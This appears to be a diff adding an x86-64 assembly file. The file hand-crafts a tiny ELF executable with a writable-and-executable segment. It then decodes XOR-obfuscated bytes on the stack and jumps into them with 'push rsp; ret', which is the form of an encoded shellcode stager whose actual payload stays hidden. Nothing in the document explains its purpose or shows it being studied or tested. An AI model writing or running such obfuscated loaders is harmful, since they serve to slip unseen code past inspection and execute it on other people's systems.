@@ -1,0 +1,137 @@
+[bits 64]
+section .text
+global _start
+org 0x08048000
+ehdr:                               ; Elf64_Ehdr
+ db 0x7F, "ELF",                    ;   e_ident
+ times 12 db      0
+ dw 2                               ;   e_type
+ dw 62                              ;   e_machine
+ dd 1                               ;   e_version
+ dq _start                          ;   e_entry
+ dq phdr - $$                       ;   e_phoff
+ dq 0                               ;   e_shoff
+ dd 0                               ;   e_flags
+ dw ehdrsize                        ;   e_ehsize
+ dw phdrsize                        ;   e_phentsize
+ dw 1                               ;   e_phnum
+ dw 0                               ;   e_shentsize
+ dw 0                               ;   e_shnum
+ dw 0                               ;   e_shstrndx
+ ehdrsize equ $ - ehdr
+phdr:                               ; Elf64_Phdr
+ dd 1                               ;   p_type
+ dd 7                               ;   p_flags
+ dq 0                               ;   p_offset
+ dq $$                              ;   p_vaddr
+ dq $$                              ;   p_paddr
+ dq filesize                        ;   p_filesz
+ dq filesize                        ;   p_memsz
+ dq 0x1000                          ;   p_align
+ phdrsize equ $ - phdr
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+_start:
+	mov rax, 0x4732727418c6cccc
+	push rax
+	xor dword [rsp+4], 0x423d2a48
+	xor dword [rsp], 0x72393333
+
+	mov rax, 0x009f763e0a632262
+	push rax
+	xor dword [rsp+4], 0x6a762a6e
+	xor dword [rsp], 0x4b662d3d
+
+	mov rax, 0x187603270a56210b
+	push rax
+	xor dword [rsp+4], 0x49375b24
+	xor dword [rsp], 0x60532e53
+
+	mov rax, 0x533c6f6562531504
+	push rax
+	xor dword [rsp+4], 0x68563031
+	xor dword [rsp], 0x35537d77
+
+	mov rax, 0x4e593b0e1f8e3306
+	push rax
+	xor dword [rsp+4], 0x6137526c
+	xor dword [rsp], 0x30317b50
+
+	mov rax, 0x293c9f055a560c0a
+	push rax
+	xor dword [rsp+4], 0x736a6970
+	xor dword [rsp], 0x5f59542b
+
+	mov rax, 0x2093d06d044d496f
+	push rax
+	xor dword [rsp+4], 0x4a5d2f25
+	xor dword [rsp], 0x5a4e235d
+
+	mov rax, 0x28587908456155c9
+	push rax
+	xor dword [rsp+4], 0x5d604e3e
+	xor dword [rsp], 0x70652d48
+
+	mov rax, 0x6f69136f1362555d
+	push rax
+	xor dword [rsp+4], 0x2e55665b
+	xor dword [rsp], 0x20506465
+
+	mov rax, 0xb66e7d37323d106f
+	push rax
+	xor dword [rsp+4], 0x372f7838
+	xor dword [rsp], 0x68357a31
+
+	mov rax, 0x1766070a051773ed
+	push rax
+	xor dword [rsp+4], 0x4727585b
+	xor dword [rsp], 0x444f213f
+
+	mov rax, 0x7a0ad2085bd7f50e
+	push rax
+	xor dword [rsp+4], 0x4b426d75
+	xor dword [rsp], 0x5a2f7646
+
+	mov rax, 0x43403f4437051e61
+	push rax
+	xor dword [rsp+4], 0x464f677d
+	xor dword [rsp], 0x5d556b61
+
+	mov rax, 0xb4a13b613e7d7844
+	push rax
+	xor dword [rsp+4], 0x4c227364
+	xor dword [rsp], 0x3125522e
+
+	mov rax, 0x1b6a1c351f2d053b
+	push rax
+	xor dword [rsp+4], 0x417a766b
+	xor dword [rsp], 0x4b2f213f
+
+	mov rax, 0x87413c44653fa24c
+	push rax
+	xor dword [rsp+4], 0x41782746
+	xor dword [rsp], 0x417b652a
+
+	mov rax, 0x137ea219641f351b
+	push rax
+	xor dword [rsp+4], 0x412c7028
+	xor dword [rsp], 0x2c467444
+
+	mov rax, 0x7f695f4e6907620b
+	push rax
+	xor dword [rsp+4], 0x2f395a41
+	xor dword [rsp], 0x315d3c54
+
+	mov rax, 0x220d50323428122b
+	push rax
+	xor dword [rsp+4], 0x20675158
+	xor dword [rsp], 0x34423b41
+
+	mov rax, 0x67393dc9b3d4cab8
+	push rax
+	xor dword [rsp+4], 0x3f786959
+	xor dword [rsp], 0x23445a28
+
+	push rsp
+	ret
+filesize equ $ - $$
